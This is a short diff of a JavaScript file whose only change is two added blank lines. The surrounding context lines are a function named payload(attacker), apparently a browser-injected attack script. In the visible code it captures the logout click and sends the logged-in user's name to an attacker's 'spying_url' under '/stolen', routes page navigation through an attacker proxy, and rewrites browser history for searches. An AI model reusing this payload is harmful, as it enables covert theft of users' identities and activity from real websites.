@@ -33,6 +33,7 @@ function payload(attacker) {
 					proxy('./', attacker);
 				});
 			});
+
 			$('#log-out-btn').click(function(event) {
 				event.preventDefault();
 				$.get(spying_url + '/stolen', {event: 'logout', user: $('#logged-in-user').text()});
@@ -48,6 +49,7 @@ function payload(attacker) {
 					proxy('./', attacker);
 				});
 			});
+
 			$('#search-btn').click(function(event) {
 				event.preventDefault();
 				history.pushState(href, null, 'search?q=' + $('#query').val());
